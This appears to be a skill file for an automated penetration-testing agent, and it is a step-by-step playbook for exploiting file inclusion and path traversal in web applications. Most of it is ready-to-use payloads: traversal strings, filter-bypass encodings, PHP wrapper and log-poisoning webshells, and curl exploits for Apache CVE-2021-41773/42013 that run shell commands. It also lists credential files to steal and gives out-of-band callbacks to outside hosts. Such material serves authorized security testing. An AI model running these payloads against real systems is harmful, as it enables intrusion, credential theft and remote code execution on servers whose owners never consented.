---
name: File Inclusion & Path Traversal
description: Detect LFI, RFI, and directory traversal in file/path/template params; confirm by reading /etc/passwd, then escalate to source disclosure and RCE.
tags: [web, lfi, rfi, path-traversal, owasp-a01]
recommended_tools: [dotdotpwn_scan, ffuf_scan, http_repeater, http_intruder, nuclei_scan, arjun_parameter_discovery]
vuln_classes: [path_traversal]
domain: web
phase: exploitation
---
# File Inclusion & Path Traversal

Any param that names a file, path, page, or template is a candidate. Read flaws -> info disclosure; include flaws -> RCE.

## Where to look
- **File/path params**: `file`, `page`, `include`, `path`, `template`, `doc`, `document`, `view`, `load`, `read`, `download`, `attachment`, `img`, `src`, `lang`, `locale`, `theme`, `module`.
- **Download/export endpoints**, PDF/report generators, image proxies, i18n loaders, archive extractors.
- Cookies/headers that select a template or locale. Use `arjun_parameter_discovery` to find hidden ones.

## Payload ladder: detect -> confirm -> escalate
1. **Traversal (Linux)** in `http_repeater` — climb deep, target a known file:
   - `../../../../../../etc/passwd`  then deeper. Confirm with the literal **`root:x:0:0:`** line.
   - Absolute path (no traversal needed): `/etc/passwd`.
2. **Traversal (Windows)**: `..\..\..\..\windows\win.ini` (look for `[fonts]`/`[extensions]`), `C:\windows\win.ini`, `..\..\boot.ini`.
3. **Bypass non-recursive strip / encoding** (see below) until `root:x:0:0:` appears.
4. **PHP wrappers (source disclosure / RCE)** when the sink is `include()/require()`:
   - Read source as base64: `php://filter/convert.base64-encode/resource=index.php` -> decode -> hunt creds/keys in `config.php`, `.env`, `wp-config.php`.
   - `data://text/plain;base64,<PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==>&c=id` (data:// RCE).
   - `php://input` with `<?php system($_GET['c']);?>` in the POST body.
   - **iconv filter-chain RCE** (no file write): `php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|...|resource=php://temp`.
5. **Log poisoning -> RCE**: inject `<?php system($_GET['c']);?>` via `User-Agent`, then include `/var/log/apache2/access.log&c=id` (also `/var/log/nginx/access.log`, `/proc/self/environ`, `/proc/self/fd/N`).
6. **RFI** (if remote includes allowed, `allow_url_include=On`): `?page=http://<oob>/shell.txt`, `?page=//<oob>/shell.txt`, `data://`.

## WAF / filter bypass
- **Encoding**: `..%2f..%2f..%2fetc%2fpasswd`, double-encode `%252e%252e%252f`, UTF-8 overlong `..%c0%af`, `%c1%9c` (Windows `\`).
- **Non-recursive strip bypass** (filter removes one `../`): `....//....//....//etc/passwd`, `..../\..../\`, `..//..//`.
- **Null byte** (PHP < 5.3.4 / old stacks): `../../etc/passwd%00`, `...%00.php`.
- **Forced extension append** -> defeat with wrapper, `%00`, path truncation, or `?` / `#` fragment.
- **Absolute-path / leading-slash tricks**: `/etc/passwd`, `....//etc/passwd`, `..\/`, mixed `..\../`.

## Tool usage
- `dotdotpwn_scan` against the host/param for traversal fuzzing across OS/encoding depths.
- `ffuf_scan` with an LFI wordlist over the param: `ffuf -u 'https://target/?page=FUZZ' -w lfi.txt -mr 'root:x:0:0:'` (`-mr` matches the proof regex). For traversal depth fuzz `-w depths.txt`.
- `http_intruder` to sweep encoding variants and flag bodies containing `root:x:0:0:` or `[fonts]`.
- `nuclei_scan` for known LFI/path-traversal templates.

## Manual http_request example
```
GET /index.php?page=php://filter/convert.base64-encode/resource=config.php HTTP/1.1
Host: target
```
Base64-decode the response to read source. Or `?file=../../../../etc/passwd` and grep the body for `root:x:0:0:`.

## Proof to capture (verifier signals)
The literal **`root:x:0:0:`** line from `/etc/passwd` in the response (Windows: `win.ini` `[fonts]`/`[extensions]`). Always aim a traversal/wrapper payload at `/etc/passwd` to emit it. Record the param + exact payload + snippet.

## Chaining
Source disclosure -> DB/JWT/cloud creds -> ATO; `.env`/config leak -> further RCE; include + log/data/wrapper -> webshell -> RCE; `/proc/self/environ` -> secrets. RFI -> direct RCE.

**Safety**: read-only confirmation (`/etc/passwd`) only; webshell drops and RFI staging are HITL-gated and scope-bound. CWE-22 / CWE-98.


<!-- Ingested from reference frameworks (skill-ingestion) -->
## Confirm via canonical-file DIFF before noisy reads
Read an in-root control file vs the traversal target and diff. `/etc/hosts` is low-noise and deterministic.
```
control:    ?file=/etc/hosts
traversal:  ?file=../../../../etc/hosts
```
Proof signal: `127.0.0.1\tlocalhost` (or `root:x:0:0:` for passwd) appears ONLY in the traversal response, not the control. Validate against fake-filesystem false positives by reading a Windows-only path on a Linux sink (must fail).

## Encoding rotation ladder for filtered sinks
```
?file=..%2f..%2f..%2f..%2fetc%2fhosts            (URL-encode)
?file=....//....//etc/hosts                       (dot-fold: strips one ../ -> Tomcat/nginx)
/static/..;/../etc/hosts                          (semicolon path param)
/static/..%252f..%252fetc%252fhosts               (double-encode -> double-decoders)
?file=/etc/passwd%00                              (null byte truncation, legacy PHP)
?file=..%5c..%5c..%5cWindows%5cwin.ini            (Windows backslash)
```
Timing oracle for blind sinks: `curl -s -o /dev/null -w '%{time_total}' '?file=../../../../var/log/syslog'`.

## PHP wrapper LFI + log/session poisoning -> RCE
```
source read:   ?file=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
base64 blocked: ?file=php://filter/convert.iconv.UTF8.UTF7|convert.base64-encode/resource=index.php
data wrapper:  ?file=data://text/plain,<?php system($_GET['c']); ?>&c=id   (needs allow_url_include)
log poison:    send  User-Agent: <?php system($_GET['c']); ?>  then  ?file=../../../../var/log/apache2/access.log&c=id
auth.log:      SSH login with username  <?php system($_GET['c']); ?>  then include /var/log/auth.log
zip wrapper:   ?file=zip:///uploads/<hash>.zip%23payload.php
```
Proof signal: decoded base64 reveals raw PHP source with creds; or log-include response contains `id`/`whoami` output.

## High-value target list (stop at first credential)
```
/proc/self/environ  /proc/self/cgroup (docker/kubepods marker)  /proc/self/cmdline
/var/www/html/.env   wp-config.php   config/database.yml
/var/run/secrets/kubernetes.io/serviceaccount/token   /etc/kubernetes/admin.conf
/home/<user>/.aws/credentials   ~/.config/gcloud/application_default_credentials.json
/home/<user>/.ssh/id_rsa
```
Proof signal: `AccessKeyId`/secret, k8s SA JWT, or `-----BEGIN ... PRIVATE KEY-----` block returned.

## Modern techniques & real-world CVEs (via recon-skills)

### Blind-LFI confirmation gate (retract false positives)
Included content is often parsed/executed but never reflected. Do NOT claim LFI from indirect signals.
- **NOT confirmation**: a different status/error for `../../etc/passwd` (app may string-match `../` and return a canned 403/500 without touching the filesystem); your input **echoed** inside an error (`failed to open '/var/www/../../etc/passwd'` is the path *formatter*, not a read — a real read shows file **contents**); a page that merely "looks different."
- **IS confirmation**: actual file *contents* (`root:x:0:0:` line, or base64 that decodes to valid PHP source); a blind OOB callback (php://filter/RFI payload hitting a per-sink Collaborator subdomain with the server's source IP); a stable **triple-confirmed** length/timing delta — known-large file (`/etc/passwd`) vs missing file (`/etc/passwd_nope_<rand>`) vs a second known-good path.
- Sub-tag OOB payloads per parameter (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which sink fired. Echoed paths and lone status-code changes are retracted.

### PHP filter-chain -> RCE with no upload / no writable file (Synacktiv 2022)
The modern flagship. A bare `php://filter` *read* primitive is upgraded to arbitrary PHP execution by chaining `iconv` charset conversions that emit controlled bytes prepending to the resource until a full `<?php ... ?>` payload is forged in-memory — then `include()` runs it. No upload endpoint, no log access, no writable path, no `open_basedir` bypass needed. This is the single most-missed high-impact test; try it whenever you have any php:// filter read.
```bash
# Public generator (not a CVE — abuses documented iconv behaviour):
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Drop the emitted chain into the sink:
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
```
Gotchas: chains get **long** (10-50KB) — if the param is length-capped or WAF-blocks on size, move it to a POST body or minimize (`<?=`shorthand`?>`). For blind targets set the chain payload to an OOB callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution.

### Server/stack CVEs to fingerprint first
| Banner / signal | CVE | Vector |
|---|---|---|
| Apache **2.4.49** | **CVE-2021-41773** | `%2e` in normalized path -> traversal read; RCE when `mod_cgi` enabled |
| Apache **2.4.50** | **CVE-2021-42013** | incomplete fix for 41773; double-encoded `%%32%65` -> traversal/RCE |
| PHP-CGI on Windows (XAMPP, `php-cgi.exe`) | **CVE-2024-4577** | Best-Fit arg-injection -> RCE; chains from file-serve |
```bash
# CVE-2021-41773 (2.4.49) file read:
curl 'http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'
# CVE-2021-42013 (2.4.50) double-encoded:
curl 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
# 41773/42013 RCE when mod_cgi on (POST body is the command):
curl 'http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; id'
```

### Stack-specific read targets
- **Java servlet** (`/WEB-INF/`): `WEB-INF/web.xml`, `WEB-INF/classes/`, `application.properties`.
- **Python Flask/Django**: `/proc/self/environ`, `settings.py` (grep `SECRET_KEY`).
- **Node** (`res.sendFile`/`express.static`): path-traversal read, `require()` traversal.
- **IIS/.NET**: `..\..\web.config`, `C:\Windows\System32\inetsrv\config\applicationHost.config` (machineKey).

### Additional wrapper & poisoning chains
```bash
# rot13 read wrapper (when base64 blocked):
?file=php://filter/read=string.rot13/resource=config.php
# PHP session poisoning: store payload in a persisted field (username/profile), then include the session file:
?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
?file=/tmp/sess_<PHPSESSID>&c=id
# phar:// object injection (needs unserialize-on-metadata sink + any upload; JPEG magic prepended to PHAR):
?file=phar:///var/www/uploads/evil.jpg
# expect:// direct exec (rare — needs expect extension loaded):
?file=expect://id
# RFI blind confirm without RCE — point at Collaborator HTTP URL; a callback (server IP) = RFI even if exec blocked:
?file=http://x.<collab>/shell   (trailing ? or # truncates an appended .php)
```

### Extra bypasses
- Blocks `php://` scheme: try case variants `PHP://` / `pHp://`, or fall back to `data://` / `expect://`.
- Blocks the literal `/etc/passwd`: `/etc/./passwd`, `/etc//passwd`, or path-truncation.
- Mixed-slash traversal: `....\/....\/etc\/passwd`.

### Severity anchoring
Non-sensitive read = **Medium**; read exposing DB creds / API keys / private keys / cloud creds = **High**; RCE via filter-chain / RFI / log / session / phar / a server CVE = **Critical**. Grounding note: cite the exact HackerOne report URL/ID you actually used — never paraphrase a report ID from memory.
